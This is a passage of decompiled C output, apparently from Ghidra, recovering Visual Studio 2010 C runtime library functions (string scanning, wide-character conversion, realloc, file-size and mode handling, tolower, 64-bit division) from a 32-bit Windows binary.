    _free(param_1[0x2a]);
    _free(param_1[0x2f]);
    _free(param_1[0x30]);
    _free(param_1[0x31]);
    _free(param_1[0x32]);
    _free(param_1[0x33]);
    _free(param_1[0x34]);
    _free(param_1[0x2e]);
    _free(param_1[0x36]);
    _free(param_1[0x37]);
    _free(param_1[0x38]);
    _free(param_1[0x39]);
    _free(param_1[0x3a]);
    _free(param_1[0x3b]);
    _free(param_1[0x35]);
    _free(param_1[0x3c]);
    _free(param_1[0x3d]);
    _free(param_1[0x3e]);
    _free(param_1[0x3f]);
    _free(param_1[0x40]);
    _free(param_1[0x41]);
    _free(param_1[0x42]);
    _free(param_1[0x43]);
    _free(param_1[0x44]);
    _free(param_1[0x45]);
    _free(param_1[0x46]);
    _free(param_1[0x47]);
    _free(param_1[0x48]);
    _free(param_1[0x49]);
    _free(param_1[0x4a]);
    _free(param_1[0x4b]);
    _free(param_1[0x4c]);
    _free(param_1[0x4d]);
    _free(param_1[0x4e]);
    _free(param_1[0x4f]);
    _free(param_1[0x50]);
    _free(param_1[0x51]);
    _free(param_1[0x52]);
    _free(param_1[0x53]);
    _free(param_1[0x54]);
    _free(param_1[0x55]);
    _free(param_1[0x56]);
    _free(param_1[0x57]);
    _free(param_1[0x58]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_00420e98) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_00420e9c) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_00420ea0) {
      _free(param_1[2]);
    }
    if ((undefined *)param_1[0xc] != PTR_DAT_00420ec8) {
      _free(param_1[0xc]);
    }
    if ((undefined *)param_1[0xd] != PTR_DAT_00420ecc) {
      _free(param_1[0xd]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_00420ea4) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_00420ea8) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_00420eac) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_00420eb0) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_00420eb4) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_00420eb8) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_00420ebc) {
      _free(*(undefined **)(param_1 + 0x24));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_00420ed0) {
      _free(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x3c) != PTR_DAT_00420ed4) {
      _free(*(undefined **)(param_1 + 0x3c));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_00420ed8) {
      _free(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x44) != PTR_DAT_00420edc) {
      _free(*(undefined **)(param_1 + 0x44));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_00420ee0) {
      _free(*(undefined **)(param_1 + 0x48));
    }
    if (*(undefined **)(param_1 + 0x4c) != PTR_DAT_00420ee4) {
      _free(*(undefined **)(param_1 + 0x4c));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_004150a4:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      FUN_0040c664();
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_00415130;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_0041515f:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_004150a4;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_00415130:
          piVar2 = __errno();
          *piVar2 = 0x22;
          FUN_0040c664();
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_0041515f;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  LPVOID pvVar2;
  int iVar3;
  int *piVar4;
  DWORD DVar5;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
  }
  else {
    do {
      if (0xffffffe0 < _NewSize) {
        __callnewh(_NewSize);
        piVar4 = __errno();
        *piVar4 = 0xc;
        return (void *)0x0;
      }
      if (_NewSize == 0) {
        _NewSize = 1;
      }
      pvVar2 = HeapReAlloc(DAT_00422218,0,_Memory,_NewSize);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      if (DAT_00422220 == 0) {
        piVar4 = __errno();
        DVar5 = GetLastError();
        iVar3 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar3;
        return (void *)0x0;
      }
      iVar3 = __callnewh(_NewSize);
    } while (iVar3 != 0);
    piVar4 = __errno();
    DVar5 = GetLastError();
    iVar3 = __get_errno_from_oserr(DVar5);
    *piVar4 = iVar3;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2010 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  int iVar2;
  
  iVar2 = FUN_00412a7e();
  if (iVar2 != 0) {
    _raise(0x16);
  }
  if ((DAT_00420f00 & 2) != 0) {
    __call_reportfault(3,0x40000015,1);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_00415363;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_00415363;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_00415363;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_00415461;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_00415363;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_004153b5;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_004153b5:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_00415461:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_00415363;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_00415363:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int *piVar1;
  char cVar2;
  byte bVar3;
  int iVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar1 = &DAT_00423840 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar4 = *piVar1 + iVar7;
  cVar2 = *(char *)(iVar4 + 0x24);
  bVar3 = *(byte *)(iVar4 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_0041552e;
      *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_0041552e:
  if ((bVar3 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar2 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    return 0x16;
  }
  *_PMode = DAT_0042263c;
  return 0;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2010 Release

void __cdecl ___initconout(void)

{
  DAT_00420f04 = CreateFileW(u_CONOUT__0041bb38,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  __flswbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __flswbuf(int _Ch,FILE *_File)

{
  uint uVar1;
  char *_Buf;
  char *pcVar2;
  uint _FileHandle;
  int *piVar3;
  undefined **ppuVar4;
  int iVar5;
  undefined *puVar6;
  int unaff_EDI;
  uint _MaxCharCount;
  longlong lVar7;
  undefined4 local_8;
  
  _FileHandle = __fileno(_File);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
LAB_004155d5:
    _File->_flag = _File->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar3 = __errno();
    *piVar3 = 0x22;
    goto LAB_004155d5;
  }
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_cnt = 0;
  local_8 = 0;
  _MaxCharCount = 2;
  _File->_flag = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar4 = FUN_0040d0c1(), _File != (FILE *)(ppuVar4 + 8) &&
       (ppuVar4 = FUN_0040d0c1(), _File != (FILE *)(ppuVar4 + 0x10))) ||
      (iVar5 = __isatty(_FileHandle), iVar5 == 0)))) {
    __getbuf(_File);
  }
  if ((_File->_flag & 0x108U) == 0) {
    local_8 = CONCAT22(local_8._2_2_,(short)_Ch);
    local_8 = __write(_FileHandle,&local_8,2);
  }
  else {
    _Buf = _File->_base;
    pcVar2 = _File->_ptr;
    _File->_ptr = _Buf + 2;
    _MaxCharCount = (int)pcVar2 - (int)_Buf;
    _File->_cnt = _File->_bufsiz + -2;
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar6 = &DAT_00420450;
      }
      else {
        puVar6 = (undefined *)((_FileHandle & 0x1f) * 0x40 + (&DAT_00423840)[(int)_FileHandle >> 5])
        ;
      }
      if (((puVar6[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64(_FileHandle,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_0041570c;
    }
    else {
      local_8 = __write(_FileHandle,_Buf,_MaxCharCount);
    }
    *(short *)_File->_base = (short)_Ch;
  }
  if (local_8 == _MaxCharCount) {
    return _Ch & 0xffff;
  }
LAB_0041570c:
  _File->_flag = _File->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_0041583c:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_0041583c;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2010 Release

int __cdecl _tolower(int _C)

{
  if (DAT_00422244 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00415971;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00415971:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x00415982. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __cfltcvt_init
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __cfltcvt_init(void)

{
  PTR_LAB_00420e50 = __cfltcvt;
  PTR_LAB_00420e54 = __cropzeros;
  PTR_LAB_00420e58 = __fassign;
  PTR_LAB_00420e5c = __forcdecpt;
  PTR_LAB_00420e60 = __positive;
  PTR_LAB_00420e64 = __cfltcvt;
  PTR_LAB_00420e68 = __cfltcvt_l;
  PTR_LAB_00420e6c = __fassign_l;
  PTR_LAB_00420e70 = __cropzeros_l;
  PTR_LAB_00420e74 = __forcdecpt_l;
  return;
}



// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2010 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



ulonglong __fastcall FUN_00415ac0(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_00423830 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
  undefined4 *unaff_FS_OFFSET;
  
  *unaff_FS_OFFSET = *(undefined4 *)*unaff_FS_OFFSET;
                    // WARNING: Could not recover jumptable at 0x00415b96. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x00415ba2. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



